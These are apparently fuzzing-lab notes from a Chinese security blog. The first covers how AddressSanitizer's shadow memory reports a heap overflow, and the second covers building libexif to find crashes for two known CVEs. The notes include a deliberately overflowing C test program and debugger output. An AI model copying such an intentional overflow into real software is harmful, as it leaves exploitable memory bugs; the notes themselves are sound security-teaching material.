class="number">0x38</span>]</span><br><span class="line">   <span class="number">0x3d0247</span> &lt;<span class="built_in">strcmp</span>+<span class="number">471</span>&gt;    <span class="keyword">xor</span>    r8d, r8d</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fffffffbb30</span><span class="number">-0x858</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x7fffffffb2d8</span> —▸ <span class="number">0x7ffff7b376a0</span> (_IO_2_1_stdout_) —▸ <span class="number">0xfbad2a84</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后执行 ASan 中的函数（ASan 已经劫持程序流了）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x43ca69</span>    call   __asan::ScopedInErrorReport::~ScopedInErrorReport()                      &lt;__asan::ScopedInErrorReport::~ScopedInErrorReport()&gt;</span><br><span class="line">       rdi: <span class="number">0x7fffffffb280</span> —▸ <span class="number">0x611000000107</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7fffffffabe0</span> ◂— <span class="number">0x7fff00000016</span></span><br><span class="line">       rdx: <span class="number">0x690</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>想要理解 ASan 的报错信息，可以参考以下博客：（这里就记录一下我的学习笔记）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43708622/article/details/117966519">理解ASAN的shadow memory和读懂报错信息</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/21cnbao/article/details/107096665">ASAN和HWASAN原理解析</a> </li>
</ul>
<p><strong>shadow memory</strong></p>
<p>shadow memory 也是内存中的一块区域，但与 main memory 又不同，shadow memory 有中元数据的思想，其中的数据放映的是 main memory 的状态信息，因此，可以将 shadow memory 看做是 main memory 的元数据，而 main memory 中存储的才是程序真正的数据</p>
<p>Malloc 函数返回的地址通常是8字节对齐的，因此可以用9种状态，来表示8字节对齐的内存可访问(可寻址)状态：</p>
<img src="/2022/08/16/Fuzz%20Lab3-TCPdump/1660657166128.png" class width="1660657166128"> 
<ul>
<li>所有的8个字节都可寻址，shadow memory 值为0</li>
<li>所有的8个字节都不可寻址，shadow memory 值为负数</li>
<li>前 k(0≤k≤7) 个字节可寻址，剩下的 7-k 个字节不可寻址，shadow memory 的值为k</li>
</ul>
<p>我们知道 malloc 函数返回的地址通常是8字节对齐的，因此任意一个由（对齐的）8字节所组成的内存区域必然落在以上9种状态之中，这9种状态便可以用 shadow memory 中的一个字节来进行编码</p>
<p>所有的8个字节都不可寻址其实可以继续分为多种情况，譬如： </p>
<ul>
<li>Heap left redzone:       fa</li>
<li>Freed heap region:       fd</li>
<li>Stack left redzone:      f1</li>
<li>Stack mid redzone:       f2</li>
<li>Stack right redzone:     f3</li>
<li>Stack after return:      f5</li>
<li>Stack use after scope:   f8</li>
<li>Global redzone:          f9</li>
<li>Global init order:       f6</li>
<li>Poisoned by user:        f7</li>
<li>Container overflow:      fc</li>
<li>Array cookie:            ac</li>
<li>Intra object redzone:    bb</li>
<li>ASan internal:           fe</li>
<li>Left alloca redzone:     ca</li>
<li>Right alloca redzone:    cb</li>
<li>Shadow gap:              cc</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2021 junfu0903@aliyun.com.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unpublished copyright. All rights reserved. This material contains</span></span><br><span class="line"><span class="comment"> * proprietary information that should be used or copied only within</span></span><br><span class="line"><span class="comment"> * junfu0903@aliyun.com, except with written permission of junfu0903@aliyun.com.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @file heap_buffer_overflow.c</span></span><br><span class="line"><span class="comment"> * @brief</span></span><br><span class="line"><span class="comment"> * @author junfu0903@aliyun.com</span></span><br><span class="line"><span class="comment"> * @version 1.0.0</span></span><br><span class="line"><span class="comment"> * @date 2021-06-15 10:18:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    p[<span class="number">17</span>] = <span class="number">12</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test -fsanitize=address -fsanitize-recover=all -fsanitize=leak -no-pie -fno-omit-frame-pointer -g </span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">==<span class="number">6154</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x602000000021</span> at pc <span class="number">0x00000040121b</span> bp <span class="number">0x7fff11080090</span> sp <span class="number">0x7fff11080080</span> <span class="comment">/* 对应代码的位置 */</span></span><br><span class="line">WRITE of size <span class="number">1</span> at <span class="number">0x602000000021</span> thread T0 <span class="comment">/* heap中的溢出点 */</span></span><br><span class="line">    #<span class="number">0</span> <span class="number">0x40121a</span> in main /home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test.c:<span class="number">22</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x7f9992b66082</span> in __libc_start_main ../csu/libc-start.c:<span class="number">308</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x4010fd</span> in _start (/home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test+<span class="number">0x4010fd</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x602000000021</span> is located <span class="number">1</span> bytes to the right of <span class="number">16</span>-byte region [<span class="number">0x602000000010</span>,<span class="number">0x602000000020</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x7f9992e41808</span> in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:<span class="number">144</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x4011db</span> in main /home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test.c:<span class="number">21</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x7f9992b66082</span> in __libc_start_main ../csu/libc-start.c:<span class="number">308</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test.c:<span class="number">22</span> in main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff7fb0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7fc0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7fd0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7fe0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7ff0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x0c047fff8000</span>: fa fa <span class="number">00</span> <span class="number">00</span>[fa]fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8010</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8020</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8030</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8040</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8050</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">6154</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>单步到 <code>0x40121b</code> 处：（程序提示的 <code>0x40121b</code> 就是发生溢出的地方）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x401216</span> &lt;main+<span class="number">96</span>&gt;     call   __asan_report_store1_noabort@plt                      &lt;__asan_report_store1_noabort@plt&gt;</span><br><span class="line">       rdi: <span class="number">0x602000000021</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x1</span></span><br><span class="line">       rdx: <span class="number">0x1</span></span><br><span class="line">       rcx: <span class="number">0x7ffff7718d01</span> (__asan::instance+<span class="number">57089</span>) ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">0x40121b</span> &lt;main+<span class="number">101</span>&gt;    mov    byte ptr [rbx], <span class="number">0xc</span> <span class="comment">/* 溢出点 */</span></span><br></pre></td></tr></table></figure>
<p>根据计算公式 <strong>Shadow = (Mem &gt;&gt; 3) + 0x7fff8000</strong>（64位）：</p>
<ul>
<li>mem 的地址 0x602000000021</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: hex((<span class="number">0x602000000021</span>&gt;&gt;<span class="number">3</span>)+<span class="number">0x7fff8000</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">&#x27;0xc047fff8004&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>得到 shadow memory 的地址是 0xC047FFF8004，刚好就是上图中由中括号括起来的 [fa]（发生溢出的 heap 地址空间）</li>
<li>而 0xC047FFF8002 和 0xC047FFF8003 两个 shadow memory 对应的值都为 0，说明这两个 shadow memory 对应的 main memory 是可寻址的（刚好就是 <code>malloc(16)</code> 申请的 0x10 字节的空间）</li>
</ul>
<p>从这里也可以窥探到 <strong>[CVE-2018-16451]</strong> 的漏洞点，但是我把 crash 放入没有 ASan 的程序却复现不出漏洞（很头痛）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/15/Fuzz%20Lab2-libexif/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/15/Fuzz%20Lab2-libexif/" class="post-title-link" itemprop="url">Fuzz Lab2-libexif</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-15 15:31:10 / Modified: 15:32:09" itemprop="dateCreated datePublished" datetime="2022-08-15T15:31:10+08:00">2022-08-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab2：libexif"><a href="#Fuzz-Lab2：libexif" class="headerlink" title="Fuzz-Lab2：libexif"></a>Fuzz-Lab2：libexif</h2><p>这次我们将 fuzz <strong>libexif</strong> EXIF 解析库（EXIF 信息，是可交换图像文件的缩写，专门为数码相机的照片设定，可以记录数码照片的属性信息和拍摄数据），目标是在 libexif 0.6.14 中找到 [<strong>CVE-2009-3895</strong>] 的 crash/PoC 和 [<strong>CVE-2012-2836</strong>] 的另一个 crash</p>
<ul>
<li><strong>CVE-2009-3895</strong> 是一种基于堆的缓冲区溢出，可以使用无效的 EXIF 图像触发<ul>
<li>基于堆的缓冲区溢出是一种发生在堆数据区域的缓冲区溢出，通常与显式动态内存管理（使用 malloc() 和 free() 函数的分配/释放）有关</li>
<li>因此，远程攻击者可以利用此问题，在使用受影响库的应用程序上下文中执行任意代码</li>
</ul>
</li>
<li><strong>CVE-2012-2836</strong> 是一个越界读取漏洞，可以通过带有精心制作的 EXIF 标签的图像触发<ul>
<li>越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞</li>
<li>因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息</li>
</ul>
</li>
</ul>
<p>学习的目标：</p>
<ul>
<li>使用外部应用程序对库进行模糊测试</li>
<li>使用 <strong>afl-clang-lto</strong>，一种比 <strong>afl-clang-fast</strong> 更快且提供更好结果的无碰撞仪器</li>
<li>使用 Eclipse IDE 作为 GDB 控制台的简单替代品进行分类</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><ul>
<li>找到一个使用 libexif 库的接口应用程序</li>
<li>创建 exif 样本的种子语料库</li>
<li>使用 afl-clang-lto 编译 libexif 和选择的应用程序进行模糊测试</li>
<li>Fuzz libexif，直到你有一些独特的崩溃</li>
<li>对崩溃进行分类以找到每个漏洞的 PoC</li>
<li>修复问题</li>
</ul>
<h2 id="CVE-2009-3895"><a href="#CVE-2009-3895" class="headerlink" title="CVE-2009-3895"></a>CVE-2009-3895</h2><h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME # 创建目录</span><br><span class="line">mkdir fuzzing_libexif &amp;&amp; cd fuzzing_libexif/</span><br><span class="line">sudo apt install build-essential</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://sourceforge.net/projects/libexif/files/libexif/0.6.18/libexif-0.6.18.tar.gz # 获取libexif</span><br><span class="line">tar -zxvf libexif-0.6.18.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz # 下载使用库接口的应用程序</span><br><span class="line">tar -xzvf exif-0_6_15-release.tar.gz</span><br><span class="line"></span><br><span class="line">cd libexif-0.6.18 # 编译libexif</span><br><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;/home/yhellow/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">cd exif-exif-0_6_15-release/</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;/home/yhellow/fuzzing_libexif/tool/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>测试 exif 能否运行只需要输入： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_libexif/tool/bin/exif</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>效果如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  exif-exif-0_6_15-release $HOME/fuzzing_libexif/tool/bin/exif </span><br><span class="line">用法: exif [OPTION...] file</span><br><span class="line">  -v, --version                   Display software version</span><br><span class="line">  -i, --ids                       Show IDs instead of tag names</span><br><span class="line">  -t, --tag=tag                   Select tag</span><br><span class="line">      --ifd=IFD                   Select IFD</span><br><span class="line">  -l, --list-tags                 List all EXIF tags</span><br><span class="line">  -|, --show-mnote                Show contents of tag MakerNote</span><br><span class="line">      --remove                    Remove tag or ifd</span><br><span class="line">  -s, --show-description          Show description of tag</span><br><span class="line">  -e, --extract-thumbnail         Extract thumbnail</span><br><span class="line">  -r, --remove-thumbnail          Remove thumbnail</span><br><span class="line">  -n, --insert-thumbnail=FILE     Insert FILE as thumbnail</span><br><span class="line">  -o, --output=FILE               Write data to FILE</span><br><span class="line">      --set-value=STRING          Value</span><br><span class="line">  -m, --machine-readable          Output in a machine-readable (tab delimited)</span><br><span class="line">                                  format</span><br><span class="line">  -x, --xml-output                Output in a XML format</span><br><span class="line">  -d, --debug                     Show debugging messages</span><br><span class="line"></span><br><span class="line">帮助选项:</span><br><span class="line">  -?, --help                      显示这个帮助信息</span><br><span class="line">      --usage                     显示简短的使用说明</span><br></pre></td></tr></table></figure>
<h2 id="Fuzz-exif"><a href="#Fuzz-exif" class="headerlink" title="Fuzz exif"></a>Fuzz exif</h2><p>在进行 fuzz 前，我们需要先了解 Exif 是什么：</p>
<ul>
<li>Exif 是一种文件格式，可交换图像文件格式（Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据</li>
<li>示例如下：</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660455820884.png" class width="1660455820884"> 
<ul>
<li>那么就需要找到这样的文件样本，好在万能的 GitHub 啥都有，可以直接下载： </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ianare/exif-samples.git</span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>exif</code>命令随便查看一张图片的信息：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd exif-samples/jpg</span><br><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_libexif/tool/bin/exif Nikon_D70.jpg</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>结果如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">EXIF tags in <span class="string">&#x27;Nikon_D70.jpg&#x27;</span> (<span class="string">&#x27;英特尔&#x27;</span> byte order):</span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">Tag                 |Value                                                     </span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">Manufacturer        |NIKON CORPORATION                                         </span><br><span class="line">Model               |NIKON D70                                                 </span><br><span class="line">Orientation         |top - left                                                </span><br><span class="line">x-Resolution        |<span class="number">240.00</span>                                                    </span><br><span class="line">y-Resolution        |<span class="number">240.00</span>                                                    </span><br><span class="line">Resolution Unit     |英寸                                                    </span><br><span class="line">Software            |GIMP <span class="number">2.4</span><span class="number">.5</span>                                                </span><br><span class="line">Date <span class="keyword">and</span> Time       |<span class="number">2008</span>:<span class="number">07</span>:<span class="number">31</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">44</span>                                       </span><br><span class="line">Compression         |JPEG 压缩                                               </span><br><span class="line">x-Resolution        |<span class="number">72.00</span>                                                     </span><br><span class="line">y-Resolution        |<span class="number">72.00</span>                                                     </span><br><span class="line">Resolution Unit     |英寸                                                    </span><br><span class="line">Exposure Time       |<span class="number">1</span>/<span class="number">200</span> sec.                                                </span><br><span class="line">FNumber             |f/<span class="number">9.0</span>                                                     </span><br><span class="line">Exposure Program    |手动                                                    </span><br><span class="line">ISO Speed Ratings   |<span class="number">200</span>                                                       </span><br><span class="line"><span class="function">Date <span class="keyword">and</span> <span class="title">Time</span> <span class="params">(origi|<span class="number">2008</span>:<span class="number">03</span>:<span class="number">15</span> <span class="number">09</span>:<span class="number">52</span>:<span class="number">01</span>                                       </span></span></span><br><span class="line"><span class="params"><span class="function">Shutter speed       |<span class="number">7.64</span> EV (<span class="number">1</span>/<span class="number">199</span> sec.)                                      </span></span></span><br><span class="line"><span class="params"><span class="function">光圈              |<span class="number">6.34</span> EV (f/<span class="number">9.0</span>)                                           </span></span></span><br><span class="line"><span class="params"><span class="function">曝光偏差        |<span class="number">-1.00</span> EV                                                  </span></span></span><br><span class="line"><span class="params"><span class="function">Maximum Aperture Val|<span class="number">3.30</span> EV (f/<span class="number">3.1</span>)                                           </span></span></span><br><span class="line"><span class="params"><span class="function">测距模式        |Center-Weighted Average                                   </span></span></span><br><span class="line"><span class="params"><span class="function">闪光灯           |未闪光                                                 </span></span></span><br><span class="line"><span class="params"><span class="function">焦距              |<span class="number">100.0</span> mm                                                  </span></span></span><br><span class="line"><span class="params"><span class="function">色彩空间        |sRGB                                                      </span></span></span><br><span class="line"><span class="params"><span class="function">PixelXDimension     |<span class="number">100</span>                                                       </span></span></span><br><span class="line"><span class="params"><span class="function">PixelYDimension     |<span class="number">66</span>                                                        </span></span></span><br><span class="line"><span class="params"><span class="function">Focal Length In <span class="number">35</span>mm|<span class="number">150</span>                                                       </span></span></span><br><span class="line"><span class="params"><span class="function">Exif Version        |Exif版本<span class="number">2.1</span>                                             </span></span></span><br><span class="line"><span class="params"><span class="function">FlashPixVersion     |FlashPix版本 <span class="number">1.0</span>                                        </span></span></span><br><span class="line"><span class="params"><span class="function">--------------------+----------------------------------------------------------</span></span></span><br><span class="line"><span class="params"><span class="function">EXIF data contains a thumbnail (<span class="number">1700</span> bytes).</span></span></span><br></pre></td></tr></table></figure>
<p>接下来使用 afl 编译器重新编译程序来执行 Fuzz</p>
<p>这次使用 afl-clang-lto 作为编译器来构建程序，afl-clang-lto 相比于 afl-clang-fast 是更好的选择，因为它是一种无碰撞检测，而且比 afl-clang-fast 快</p>
<ul>
<li>使用编译器重新构建程序： </li>
</ul>
